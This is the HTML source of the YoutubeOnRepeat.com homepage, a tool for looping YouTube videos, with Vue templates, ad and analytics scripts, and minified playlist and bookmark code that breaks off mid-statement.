<!doctype html>
<!-- serving from gridserver -->
<html lang="en">

<head>
    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
<meta name="theme-color" content="#EE4236">
<meta name="msapplication-navbutton-color" content="#EE4236">
<meta name="apple-mobile-web-app-status-bar-style" content="#EE4236">
<meta name="cache-control" content="no-cache, no-store, must-revalidate">

<link rel="apple-touch-icon" sizes="57x57" href="/apple-touch-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/apple-touch-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/apple-touch-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/apple-touch-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/apple-touch-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon-180x180.png">
<link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/favicon-194x194.png" sizes="194x194">
<link rel="icon" type="image/png" href="/android-chrome-192x192.png" sizes="192x192">
<link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
<link rel="manifest" href="/manifest.json">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#E14E42">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="/mstile-144x144.png">

<!-- global CSS -->

<script async='async' src='https://www.googletagservices.com/tag/js/gpt.js'></script>
<script>
    var googletag = googletag || {};
    googletag.cmd = googletag.cmd || [];
    googletag.cmd.push(function() {
        googletag.pubads().disableInitialLoad();
        googletag.pubads().enableSingleRequest();
        googletag.enableServices();
    });


</script>

<script src="//cdn.districtm.ca/merge/merge.121447.js"></script>

<script>
    </script>

    <link rel="stylesheet" href="/app/assets/css/core.css">
    <link rel="stylesheet" href="/app/assets/css/style.css">
    <!--<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css" integrity="sha384-rwoIResjU2yc3z8GV/NPeZWAv56rSmLldC3R/AZzGRnGxQQKnKkoFVhFQhNUwEyJ" crossorigin="anonymous">-->
    <!--<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">-->
    <!--<link href="https://use.fontawesome.com/releases/v5.0.6/css/all.css" rel="stylesheet">-->

    <title>Repeat youtube videos automatically - Youtube On Repeat</title>
    <meta name="description" content="Make youtube repeat videos automatically, crop youtube videos and repeat youtube fragments in a loop with Youtube on Repeat. Repeat youtube videos non-stop."/>

    <meta property="fb:admins" content="100000026051093"/>
<meta property="fb:app_id" content="429432483762983"/>
<meta property="og:title" content="Youtube On Repeat - Repeat youtube videos automatically"/>
<meta property="og:url" content="http://youtubeonrepeat.com"/>
<meta property="og:image" content="http://youtubeonrepeat.com/app/assets/img/fb.png" />
<meta property="og:type" content="website"/>
<meta property="og:site_name" content="YoutubeOnRepeat.com"/>
<meta property="og:description" content="Repeat YouTube videos automatically with Youtube On Repeat."/>

<meta name="twitter:card" content="summary">
<meta name="twitter:site" content="@youtubeonrepeat">
<meta name="twitter:url" content="http://youtubeonrepeat.com">
<meta name="twitter:title" content="Youtube On Repeat - Repeat youtube videos automatically">
<meta name="twitter:description" content="Repeat YouTube videos automatically with Youtube On Repeat.">
<meta name="twitter:image" content="http://youtubeonrepeat.com/app/assets/img/fb.png">
<meta name="twitter:image:src" content="http://youtubeonrepeat.com/app/assets/img/fb.png"></head>

<body>
    <!-- global drawer menu -->
<div class="drawer drawer--container" data-vue="js-vue--drawer">
    <form class="drawer__ap-form playlist--mobile-detect">
        <input class="js--new-playlist-title" type="text" placeholder="Add a new Playlist" />
    </form>
    <a class="btn--icon-plus js--add-playlist-form-toggle playlist--mobile-detect" href="javascript:;"></a>
    
    <h3 class="drawer__title playlist--mobile-detect">My Playlists</h3>
    <ul class="drawer__list playlist--mobile-detect" data-list="playlist" v-if="data.playlists.length">
        <li v-for="item in data.playlists" class="js--playlist" data-id="{{item.id}}">
            <a class="drawer__item ellipsis js--open-playlist-drawer" href="javascript:;" data-count="{{item.tracks.length}}">{{item.title}}</a>
            <a class="btn--icon-dots" data-open-menu="playlist" href="javascript:;"></a>
            <div class="menu-placeholder"></div>
            
            <div class="drawer">
                <a class="btn--icon-back js--close-playlist-drawer" href="javascript:;"></a>
                <h3 class="drawer__title ellipsis">{{item.title}}</h3>
                <ul class="drawer__list drawer__list--inplaylist" v-if="item.tracks.length">
                    <li v-for="track in item.tracks" data-id="{{track.id}}">
                        <a class="drawer__item ellipsis" href="/watch/?v={{track.id}}&plid={{item.id}}{{track.from || ''}}{{track.to || ''}}">{{track.title}}</a>
                        <a class="btn--icon-close js--drawer-remove-from-playlist" href="javascript:;"></a>
                    </li>
                </ul>
                <div class="drawer__instructions">Find the <span class="btn--icon-dots"></span> button on any track to add it to your playlist!</div>
            </div>
        </li>
    </ul>
    <div class="drawer__instructions playlist--mobile-detect">To create your first playlist, click the <a class="btn--icon-plus js--add-playlist-form-toggle" href="javascript:;"></a> button, type a playlist name and hit ENTER. <a href="/info/#my-watchlist-and-playlist" class="drawer__instructions--link">Learn More &raquo;</a></div>
    
    <h3 class="drawer__title">My Watchlist</h3>
    <ul class="drawer__list" data-list="bookmarks" v-if="data.bookmarks.length">
        <li v-for="item in data.bookmarks" data-id="{{item.id}}">
            <a class="drawer__item ellipsis" href="/watch/?v={{item.id}}{{item.from || ''}}{{item.to || ''}}">{{item.title}}</a>
            <a class="btn--icon-close js--drawer-remove-bookmark" href="javascript:;"></a>
        </li>
    </ul>
    <div class="drawer__instructions">Find the <span class="btn--icon-dots"></span> button on any track to add it to your Bookmarks! <a href="/info/#my-watchlist-and-playlist" class="drawer__instructions--link">Learn More &raquo;</a></div>
</div>
<div class="overlay js--toggle-drawer"></div>

<!-- global header -->
<header class="header">
    <a class="btn--icon-hamburger js--toggle-drawer" href="javascript:;"></a><!--
    --><a class="sprite header__logo" href="/" title="Youtube On Repeat">Youtube<span>On</span>Repeat</a><!--
    -->
        <form class="header__form search_bar" style="top: 13px;width: 50%" id="search" action="/results/">


              <input type="text" id="search__query" name="search_query" placeholder="Search any YouTube video..." autocomplete="off">


                <button type="submit"></button>


    </form>
    <div class="header__cta">
        <div class="header__follow">
            <span class="header__follow-msg">Follow us:</span><!--
            --><a href="https://www.facebook.com/YoutubeOnRepeat/" class="header__follow-btn icon-facebook" target="_blank">
                <svg class="icon"><use xlink:href="#icon-facebook"></use></svg>
            </a><!--
            --><a href="https://twitter.com/YoutubeOnRepeat" class="header__follow-btn icon-twitter" target="_blank">
                <svg class="icon"><use xlink:href="#icon-twitter"></use></svg>
            </a>
        </div>
        <a href="/youtube-repeat-button/" class="header__repeat-btn">Get the Repeat Button</a>
    </div>
</header>
<div style='height:auto; width:auto;margin: 0 auto 5px auto;text-align: center;display: block;align: center'>    <script>
    googletag.cmd.push(function() {
        googletag.defineOutOfPageSlot('/127208727/YTOR_desk_mob_1X1', 'div-gpt-ad-1517736354598-3').addService(googletag.pubads());
    });
    </script>
        
<div id='div-gpt-ad-1517736354598-3' style='height:auto; width:auto;'>
<script>
googletag.cmd.push(function() { googletag.display('div-gpt-ad-1517736354598-3'); });
</script>
</div>
</div>
<main role="main">
    <!-- global search -->
    <template data-vue="js-vue--posts-search">
        <div class="layout search" v-if="posts.items">
            <section class="layout__main">
                <div class="search__container has--shadow">
                    <div class="search__header">
                        Here's what we found for <strong class="js-search--query breakword">{{posts.query}}</strong>:
                    </div>

                    <div class="search__results">
                        <div>
    <div v-for="item in posts.items"
         v-show="item.ytid != 'AAAAAAAAAAA' && 
                item.snippet.channelTitle.length && 
                item.snippet.liveBroadcastContent != 'live'"
         class="item" data-id="{{item.ytid}}"
         data-thumb-url="https://i.ytimg.com/vi/{{item.ytid}}/mqdefault.jpg">
        <a href="/watch/?v={{item.ytid}}" class="item__link">
            <div class="item__thumb b-lazy" data-src="https://i.ytimg.com/vi/{{item.ytid}}/mqdefault.jpg"></div>
            <span class="item__title js--title">{{item.snippet.title}}</span>
            <div class="item__meta">
                <p class="item__publisher-name">{{item.snippet.channelTitle}}</p>
                <p class="item__date">{{item.snippet.publishedAt}}</p>
            </div>
        </a>
        <div class="item__menu">
            <a class="btn--icon-dots" href="javascript:;" data-open-menu="track"></a>
            <div class="menu-placeholder"></div>
        </div>
    </div>
</div>                    </div>

                    <div class="search__footer">
                        <a href="javascript:;" class="button search__loadmore">LOAD MORE</a>
                        <div class="is--hidden search__end">That's all folks!</div>
                    </div>
                </div>
            </section>
            <section class="layout__secondary sidebar has--shadow">
    <h2 class="sidebar__title">Let's be friends!</h2>
    <div class="sidebar__likeus">
        <span class="sidebar__likeus-title">You know you want to</span>
        <iframe src="https://www.facebook.com/plugins/like.php?href=https%3A%2F%2Fwww.facebook.com%2FYoutubeOnRepeat%2F&width=90&layout=button_count&action=like&size=small&show_faces=false&share=false&height=21&appId=429432483762983" width="90" height="21" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowTransparency="true"></iframe>
    </div>
</section>        </div>
    </template>

    <div style='height:90px; width:728px;margin: 0 auto 5px auto;text-align: center;display: block;align: center'>    <script>
        googletag.cmd.push(function() {
            googletag.defineSlot('/127208727/YTOR_desk_728X90-1', [728, 90], 'div-gpt-ad-1517736354598-1').addService(googletag.pubads());
        });
    </script>
        
<div id='div-gpt-ad-1517736354598-1' style='height:90px; width:728px;'>
<script>
googletag.cmd.push(function() { googletag.display('div-gpt-ad-1517736354598-1'); });
</script>
</div>
</div>
    <div class="hero" style="padding-bottom: 0px;padding-top: 0px">

        <img class="hero__logo" src="/app/assets/img/youtube_on_repeat.png" width="240" height="165" />
        <h1 class="hero__heading">Repeat YouTube videos automatically</h1>
        <span class="hero__subheading">(or just parts of them, for that matter)</span>
        <p class="hero__description" style="">Repeat YouTube videos, crop your favorite part of a video, create Playlists on the fly and save videos to your Bookmarks list. <span class="hero__ending">No accounts, no downloads, just music.</span></p>

    </div>
    <div style='height:90px; width:728px;margin: 0 auto 5px auto;text-align: center;display: block;align: center'>    <script>
        googletag.cmd.push(function() {
            googletag.defineSlot('/127208727/YTOR_desk_728X90-2', [728, 90], 'div-gpt-ad-1517736354598-2').addService(googletag.pubads());
        });
    </script>
        
<div id='div-gpt-ad-1517736354598-2' style='height:90px; width:728px;'>
<script>
googletag.cmd.push(function() { googletag.display('div-gpt-ad-1517736354598-2'); });
</script>
</div>
</div>

        

    <div class="home-section layout">
        <template data-vue="js-vue--posts-recent">
            <div class="itemgrid" v-if="posts.items.length">
                <h2 class="home-section__title">Recent Loops</h2>
                <div>
                    <div v-for="item in posts.items"
                         class="item" data-id="{{item.id}}"
                         data-thumb-url="https://i.ytimg.com/vi/{{item.id}}/mqdefault.jpg">
                        <a href="/watch/?v={{item.id}}" class="item__link">
                            <div class="item__thumb b-lazy" data-src="https://i.ytimg.com/vi/{{item.id}}/mqdefault.jpg"></div>
                            <span class="item__title js--title">{{item.title}}</span>
                            <div class="item__meta">
                                <p class="item__publisher-name">{{item.publisher}}</p>
                                <p class="item__date">{{item.date}}</p>
                            </div>
                        </a>
                        <div class="item__menu">
                            <a class="btn--icon-dots" href="javascript:;" data-open-menu="track"></a>
                            <div class="menu-placeholder"></div>
                        </div>
                    </div>
                </div>
            </div>
        </template>

        
        <template data-vue="js-vue--posts-popular">
            <div class="itemgrid" v-if="posts.items">
                <h2 class="home-section__title">Popular Repeats</h2>
                <div>
    <div v-for="item in posts.items"
         v-show="item.ytid != 'AAAAAAAAAAA' && 
                item.snippet.channelTitle.length && 
                item.snippet.liveBroadcastContent != 'live'"
         class="item" data-id="{{item.ytid}}"
         data-thumb-url="https://i.ytimg.com/vi/{{item.ytid}}/mqdefault.jpg">
        <a href="/watch/?v={{item.ytid}}" class="item__link">
            <div class="item__thumb b-lazy" data-src="https://i.ytimg.com/vi/{{item.ytid}}/mqdefault.jpg"></div>
            <span class="item__title js--title">{{item.snippet.title}}</span>
            <div class="item__meta">
                <p class="item__publisher-name">{{item.snippet.channelTitle}}</p>
                <p class="item__date">{{item.snippet.publishedAt}}</p>
            </div>
        </a>
        <div class="item__menu">
            <a class="btn--icon-dots" href="javascript:;" data-open-menu="track"></a>
            <div class="menu-placeholder"></div>
        </div>
    </div>
</div>            </div>
        </template>
    </div>

    <footer class="layout">
    <div class="footer">
        <a href="/" class="sprite footer__logo">Youtube on Repeat</a>
    
        <div class="footer__info">
            <a class="footer__link" href="/youtube-repeat-button/">Get the Repeat Button</a>
            <a class="footer__link" href="/info/">How it Works</a>
            <a class="footer__link" href="/backup/">Backup/Restore/Delete your data</a>
            <span class="footer__link email-address"></span>
            
            <div class="footer__follow">
                <a href="https://www.facebook.com/YoutubeOnRepeat/" class="footer__follow-btn icon-facebook" target="_blank">
                    <svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-facebook"></use></svg>
                </a>
                <a href="https://twitter.com/YoutubeOnRepeat" class="footer__follow-btn icon-twitter" target="_blank">
                    <svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-twitter"></use></svg>
                </a>
            </div>
            
            <p class="footer__disclaimer">
                <a class="footer__link" href="/legal/">Privacy & Cookies.</a>
                YoutubeOnRepeat.com is not associated with YouTube.
            </p>
        </div>
    </div>
</footer>

<svg style="position: absolute; width: 0; height: 0;" width="0" height="0" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <defs>
        <symbol id="icon-google-plus" viewBox="0 0 16 16">
            <title>google-plus</title>
            <path class="path1" d="M5.091 7.147v1.747h2.888c-0.116 0.75-0.872 2.197-2.888 2.197-1.737 0-3.156-1.441-3.156-3.216s1.419-3.216 3.156-3.216c0.991 0 1.65 0.422 2.028 0.784l1.381-1.331c-0.888-0.828-2.037-1.331-3.409-1.331-2.816 0.003-5.091 2.278-5.091 5.094s2.275 5.091 5.091 5.091c2.937 0 4.888-2.066 4.888-4.975 0-0.334-0.037-0.591-0.081-0.844h-4.806z"></path>
            <path class="path2" d="M16 7h-1.5v-1.5h-1.5v1.5h-1.5v1.5h1.5v1.5h1.5v-1.5h1.5z"></path>
        </symbol>
        <symbol id="icon-facebook" viewBox="0 0 16 16">
            <title>facebook</title>
            <path class="path1" d="M9.5 3h2.5v-3h-2.5c-1.93 0-3.5 1.57-3.5 3.5v1.5h-2v3h2v8h3v-8h2.5l0.5-3h-3v-1.5c0-0.271 0.229-0.5 0.5-0.5z"></path>
        </symbol>
        <symbol id="icon-twitter" viewBox="0 0 16 16">
            <title>twitter</title>
            <path class="path1" d="M16 3.538c-0.588 0.263-1.222 0.438-1.884 0.516 0.678-0.406 1.197-1.050 1.444-1.816-0.634 0.375-1.338 0.65-2.084 0.797-0.6-0.638-1.453-1.034-2.397-1.034-1.813 0-3.281 1.469-3.281 3.281 0 0.256 0.028 0.506 0.084 0.747-2.728-0.138-5.147-1.444-6.766-3.431-0.281 0.484-0.444 1.050-0.444 1.65 0 1.138 0.578 2.144 1.459 2.731-0.538-0.016-1.044-0.166-1.488-0.409 0 0.013 0 0.028 0 0.041 0 1.591 1.131 2.919 2.634 3.219-0.275 0.075-0.566 0.116-0.866 0.116-0.212 0-0.416-0.022-0.619-0.059 0.419 1.303 1.631 2.253 3.066 2.281-1.125 0.881-2.538 1.406-4.078 1.406-0.266 0-0.525-0.016-0.784-0.047 1.456 0.934 3.181 1.475 5.034 1.475 6.037 0 9.341-5.003 9.341-9.341 0-0.144-0.003-0.284-0.009-0.425 0.641-0.459 1.197-1.038 1.637-1.697z"></path>
        </symbol>
        <symbol id="icon-tumblr" viewBox="0 0 16 16">
            <title>tumblr</title>
            <path class="path1" d="M9.001 7l-0 3.659c0 0.928-0.012 1.463 0.086 1.727 0.098 0.262 0.342 0.534 0.609 0.691 0.354 0.212 0.758 0.318 1.214 0.318 0.81 0 1.289-0.107 2.090-0.633v2.405c-0.683 0.321-1.279 0.509-1.833 0.639-0.555 0.129-1.154 0.194-1.798 0.194-0.732 0-1.163-0.092-1.725-0.276-0.562-0.185-1.042-0.45-1.438-0.79-0.398-0.343-0.672-0.706-0.826-1.091s-0.23-0.944-0.23-1.676v-5.611h-2.147v-2.266c0.628-0.204 1.331-0.497 1.778-0.877 0.449-0.382 0.809-0.839 1.080-1.374 0.272-0.534 0.459-1.214 0.561-2.039h2.579l-0 4h3.999v3h-3.999z"></path>
        </symbol>
        <symbol id="icon-reddit" viewBox="0 0 16 16">
            <title>reddit</title>
            <path class="path1" d="M4 10c0-0.552 0.448-1 1-1s1 0.448 1 1c0 0.552-0.448 1-1 1s-1-0.448-1-1zM10 10c0-0.552 0.448-1 1-1s1 0.448 1 1c0 0.552-0.448 1-1 1s-1-0.448-1-1zM10.049 12.137c0.258-0.203 0.631-0.159 0.834 0.099s0.159 0.631-0.099 0.834c-0.717 0.565-1.81 0.93-2.783 0.93s-2.066-0.365-2.784-0.93c-0.258-0.203-0.302-0.576-0.099-0.834s0.576-0.302 0.834-0.099c0.413 0.325 1.23 0.675 2.049 0.675s1.636-0.35 2.049-0.675zM16 8c0-1.105-0.895-2-2-2-0.752 0-1.406 0.415-1.748 1.028-1.028-0.562-2.28-0.926-3.645-1.010l1.193-2.68 2.284 0.659c0.206 0.583 0.761 1.002 1.415 1.002 0.828 0 1.5-0.672 1.5-1.5s-0.672-1.5-1.5-1.5c-0.571 0-1.068 0.319-1.321 0.789l-2.545-0.735c-0.285-0.082-0.587 0.058-0.707 0.329l-1.621 3.641c-1.33 0.094-2.551 0.453-3.557 1.004-0.342-0.613-0.996-1.028-1.748-1.028-1.105 0-2 0.895-2 2 0 0.817 0.491 1.52 1.193 1.83-0.126 0.375-0.193 0.767-0.193 1.17 0 2.761 3.134 5 7 5s7-2.239 7-5c0-0.403-0.067-0.795-0.193-1.17 0.703-0.31 1.193-1.013 1.193-1.83zM13.5 2.938c0.311 0 0.563 0.252 0.563 0.563s-0.252 0.563-0.563 0.563-0.563-0.252-0.563-0.563 0.252-0.563 0.563-0.563zM1 8c0-0.551 0.449-1 1-1 0.399 0 0.743 0.234 0.904 0.573-0.523 0.396-0.956 0.854-1.276 1.355-0.368-0.148-0.628-0.508-0.628-0.928zM8 14.813c-3.21 0-5.813-1.707-5.813-3.813s2.602-3.813 5.813-3.813c3.21 0 5.813 1.707 5.813 3.813s-2.602 3.813-5.813 3.813zM14.372 8.928c-0.32-0.502-0.753-0.959-1.276-1.355 0.161-0.338 0.505-0.573 0.904-0.573 0.551 0 1 0.449 1 1 0 0.42-0.26 0.78-0.628 0.928z"></path>
        </symbol>
        <symbol id="icon-pinterest2" viewBox="0 0 16 16">
            <title>pinterest2</title>
            <path class="path1" d="M8 0c-4.412 0-8 3.587-8 8s3.587 8 8 8 8-3.588 8-8-3.588-8-8-8zM8 14.931c-0.716 0-1.403-0.109-2.053-0.309 0.281-0.459 0.706-1.216 0.862-1.816 0.084-0.325 0.431-1.647 0.431-1.647 0.225 0.431 0.888 0.797 1.587 0.797 2.091 0 3.597-1.922 3.597-4.313 0-2.291-1.869-4.003-4.272-4.003-2.991 0-4.578 2.009-4.578 4.194 0 1.016 0.541 2.281 1.406 2.684 0.131 0.063 0.2 0.034 0.231-0.094 0.022-0.097 0.141-0.566 0.194-0.787 0.016-0.069 0.009-0.131-0.047-0.2-0.287-0.347-0.516-0.988-0.516-1.581 0-1.528 1.156-3.009 3.128-3.009 1.703 0 2.894 1.159 2.894 2.819 0 1.875-0.947 3.175-2.178 3.175-0.681 0-1.191-0.563-1.025-1.253 0.197-0.825 0.575-1.713 0.575-2.306 0-0.531-0.284-0.975-0.878-0.975-0.697 0-1.253 0.719-1.253 1.684 0 0.612 0.206 1.028 0.206 1.028s-0.688 2.903-0.813 3.444c-0.141 0.6-0.084 1.441-0.025 1.988-2.578-1.006-4.406-3.512-4.406-6.45 0-3.828 3.103-6.931 6.931-6.931s6.931 3.103 6.931 6.931c0 3.828-3.103 6.931-6.931 6.931z"></path>
        </symbol>
    </defs>
</svg>

<div id="globalNotification"></div>
</main>
<script>
    googletag.cmd.push(function() {
        googletag.pubads().refresh();
    });
</script>

<script id="spout-tag-1d4b207d-98b2-43ae-9d60-f8bd41a4f6a2">
  (function() {
    var r = encodeURIComponent(top.document.referrer.substring(0,250)),
        p = encodeURIComponent(top.document.location.href.substring(0,250)),
        t = Date.now(),
        u = '1d4b207d-98b2-43ae-9d60-f8bd41a4f6a2',
        e = document.createElement('script'),
        s = sessionStorage.getItem('spoutable-' + u);
    if (!s) {
      var m = Math.random.bind(Math);
      s = JSON.stringify({ sessionId: [ t, m(), m(), m(), m(), m(), m(), m(), m(), m(), m(), m(), m() ]});
      sessionStorage.setItem('spoutable-' + u, s);
    }
    e.async = true;
    e.src='//s.spoutable.com/s?u='+u+'&s='+encodeURIComponent(s)+'&t='+t+'&r='+r+'&p='+p;
    document.head.appendChild(e);
  })();
</script>


    <!-- Google Analytics -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-32892186-1', 'auto');
  ga('send', 'pageview');
</script>

    <!-- libraries -->
    <!--<script src="/app/assets/js/lib/vue.min.js"></script>
    <script src="/app/assets/js/lib/jquery-2.2.3.min.js"></script>
    <script src="/app/assets/js/lib/jquery-ui.min.js"></script>
    <script src="/app/assets/js/lib/blazy.min.js"></script>
    <script src="/app/assets/js/lib/detectmobilebrowser.js"></script>-->
    <!-- core -->
    <!--<script src="/app/assets/js/app.js"></script>
    <script src="/app/assets/js/utils.js"></script>
    <script src="/app/assets/js/drawer.js"></script>
    <script src="/app/assets/js/addmenu.js"></script>
    <script src="/app/assets/js/sharer.js"></script>
    <script src="/app/assets/js/common.js"></script>-->

    <script src="/app/assets/js/min/lib.js?cachebuster=2"></script>
    <!-- minified core js -->
    <script>var bLazy=new Blazy;$(document).on("scroll",function(){bLazy.revalidate()});var app={apiKey:"AIzaSyDOqH1fCM3VV9hjSpsEXLNGn3gL6QJ12s8",fbAppId:"429432483762983",normalize:function(data){var items=data.items;for(var key in items){var thisData=items[key];if(typeof thisData.id==="object")thisData["ytid"]=thisData.id.videoId;else thisData["ytid"]=thisData.id;thisData.snippet.publishedAt=thisData.snippet.publishedAt.substr(0,10)}return data},populate:function(url,count,el){$.ajax({url:"https://www.googleapis.com/youtube/v3/"+url+"&maxResults="+count+"&fields=items/id,nextPageToken,"+"items/snippet/channelTitle,"+"items/snippet/publishedAt,"+"items/snippet/title,"+"items/snippet/liveBroadcastContent"+"&part=snippet"+"&type=video"+"&videoEmbeddable=true"+"&key="+app.apiKey,dataType:"jsonp",success:function(data){var vm=new Vue({el:el,data:{posts:{items:app.normalize(data).items,nextPageToken:data.nextPageToken}},ready:function(){$(this.$el).removeAttr("data-vue");bLazy.revalidate();$("body").trigger("loadmore",{nextPage:data.nextPageToken,el:el})}})}})},storage:{getData:function(){return JSON.parse(localStorage.getItem("yorcom"))||{userdata:{playlists:[{id:$.now(),title:"Default Playlist",tracks:[]}],bookmarks:[]},history:[]}},update:function(data){localStorage.setItem("yorcom",JSON.stringify(data))}}},LS=app.storage.getData();function notifyUser(message){$("#globalNotification").stop().fadeOut(0).text(message).fadeIn(250,function(){$("#globalNotification").delay(1500).fadeOut(250)})}function genObject($item){var obj={id:$item.attr("data-id"),title:$item.find(".js--title").text()};if($item.is(".mediacard")){var _from=parseInt($("#videoStart").attr("data-time")),_to=parseInt($("#videoEnd").attr("data-time")),_length=convert_time($("body").attr("data-videolength"));if(_from>0)obj["from"]="&from="+_from;if(_to!=_length)obj["to"]="&to="+_to}return obj}function genHistoryObject($item){return{id:$item.attr("data-id"),title:$item.find(".js--title").text(),publisher:$item.find(".js--author").text(),date:$item.find(".js--date").text()}}function addBookmark(e){var $t=$("#addBookmark"),$item=$t.parents("[data-id]").first();$t.is(":checked")?LS.userdata.bookmarks.unshift(genObject($item)):removeBookmark(e);app.storage.update(LS);ga("send",{hitType:"event",eventCategory:"Watchlist",eventAction:"click",eventLabel:"Watchlist Add"})}function removeBookmark(e){var bookmarkId=$(e.target).parents("[data-id]").first().attr("data-id"),bookmarkIndex=$("[data-list=bookmarks]").find("[data-id="+bookmarkId+"]").index();LS.userdata.bookmarks.splice(bookmarkIndex,1);app.storage.update(LS);ga("send",{hitType:"event",eventCategory:"Watchlist",eventAction:"click",eventLabel:"Watchlist Remove"})}function removeFromPlaylist(e){var $t=$(e.target),trackId=$t.parents("[data-id]").first().attr("data-id"),playlistIndex=$t.parents(".js--playlist").index(),trackIndex=$("[data-list=playlist] .js--playlist").eq(playlistIndex).find("[data-id="+trackId+"]").index();LS.userdata.playlists[playlistIndex].tracks.splice(trackIndex,1);app.storage.update(LS);ga("send",{hitType:"event",eventCategory:"Playlist",eventAction:"click",eventLabel:"Playlist Remove"})}function addToPlaylist(e){var $t=$(e.target),$item=$t.parents("[data-id]").first(),playlistIndex=$t.parents(".js--playlist").index();$t.is(":checked")?LS.userdata.playlists[playlistIndex].tracks.unshift(genObject($item)):removeFromPlaylist(e);app.storage.update(LS);ga("send",{hitType:"event",eventCategory:"Playlist",eventAction:"click",eventLabel:"Playlist Add"})}function renamePlaylist(e){e.preventDefault();var $t=$(e.target),playlistName=$t.find("input").val();if(!playlistName.length)return false;var playlistIndex=$t.parents(".js--playlist").index(),newPlaylist=LS.userdata.playlists[playlistIndex];newPlaylist.title=playlistName;LS.userdata.playlists.splice(playlistIndex,1,newPlaylist);app.storage.update(LS);ga("send",{hitType:"event",eventCategory:"Playlist",eventAction:"click",eventLabel:"Playlist Rename"})}function removePlaylist(e){LS.userdata.playlists.splice($(e.target).parents(".js--playlist").index(),1);app.storage.update(LS);ga("send",{hitType:"event",eventCategory:"Playlist",eventAction:"click",eventLabel:"Playlist Remove"})}function arrMove(arr,from,to){arr.splice(to,0,arr.splice(from,1)[0]);return arr}function makeSortable(){var oldIndex;$("[data-list],.drawer__list--inplaylist").sortable({axis:"y",delay:150,start:function(event,ui){oldIndex=$(ui.item).index()},update:function(event,ui){var $t=$(ui.item),newIndex=$t.index(),$list=$t.parent();if($list.is('[data-list="bookmarks"]')){arrMove(LS.userdata.bookmarks,oldIndex,newIndex)}else if($list.is('[data-list="playlist"]')){arrMove(LS.userdata.playlists,oldIndex,newIndex)}else{var playlistIndex=$list.parents(".js--playlist").index();arrMove(LS.userdata.playlists[playlistIndex].tracks,oldIndex,newIndex)}app.storage.update(LS);makeSortable()}})}function convert_time(duration){var a=duration.match(/\d+/g);if(duration.indexOf("M")>=0&&duration.indexOf("H")==-1&&duration.indexOf("S")==-1){a=[0,a[0],0]}if(duration.indexOf("H")>=0&&duration.indexOf("M")==-1){a=[a[0],0,a[1]]}if(duration.indexOf("H")>=0&&duration.indexOf("M")==-1&&duration.indexOf("S")==-1){a=[a[0],0,0]}duration=0;if(a.length==3){duration=duration+parseInt(a[0])*3600;duration=duration+parseInt(a[1])*60;duration=duration+parseInt(a[2])}if(a.length==2){duration=duration+parseInt(a[0])*60;duration=duration+parseInt(a[1])}if(a.length==1){duration=duration+parseInt(a[0])}return duration}function getNumber(str){return parseInt(str.replace(/\D/g,""))}function getRandomInt(min,max){return Math.floor(Math.random()*(max-min+1))+min}$(function(){var $playlistForm=$(".drawer__ap-form"),vm=new Vue({el:'[data-vue="js-vue--drawer"]',data:{data:LS.userdata},ready:function(){$(this.$el).removeAttr("data-vue")}});$(".js--toggle-drawer").on("click",function(){$("html").toggleClass("drawer--active");$(window).trigger("hamburger.toggle");ga("send",{hitType:"event",eventCategory:"Drawer",eventAction:"click",eventLabel:$("html").is(".drawer--active")?"Drawer Open":"Drawer Close"})});$("body").on("click",".js--open-playlist-drawer",function(){$(this).siblings(".drawer").addClass("drawer--secondary-active")});$("body").on("click",".js--close-playlist-drawer",function(){$(this).parent().removeClass("drawer--secondary-active")});$("body").on("click",".js--add-playlist-form-toggle",function(){$(".js--add-playlist-form-toggle").toggleClass("is--active");$playlistForm.toggleClass("is--active").find("input").focus().val("")});$playlistForm.on("submit",function(e){e.preventDefault();var $titleInput=$(".js--new-playlist-title"),oNewPlaylist={id:$.now(),title:$titleInput.val(),tracks:[]};$titleInput.val("");$(".js--add-playlist-form-toggle").removeClass("is--active");$(this).toggleClass("is--active").find("input").blur();LS.userdata.playlists.push(oNewPlaylist);app.storage.update(LS);ga("send",{hitType:"event",eventCategory:"Playlist",eventAction:"click",eventLabel:"Playlist Create"})});$("body").on("click",".js--drawer-remove-bookmark",removeBookmark);$("body").on("submit","#renamePlaylist",renamePlaylist);$("body").on("click",".js--remove-playlist",removePlaylist);$("body").on("click",".js--drawer-remove-from-playlist",removeFromPlaylist);makeSortable()});var tpl={menuTrack:function($trigger){var $item=$trigger.parents("[data-id]").first(),itemId=$item.attr("data-id"),isBookmark=$("[data-list=bookmarks]").find("[data-id="+itemId+"]").length?"checked":"",playlists="";for(var i=0;i<LS.userdata.playlists.length;i++){var 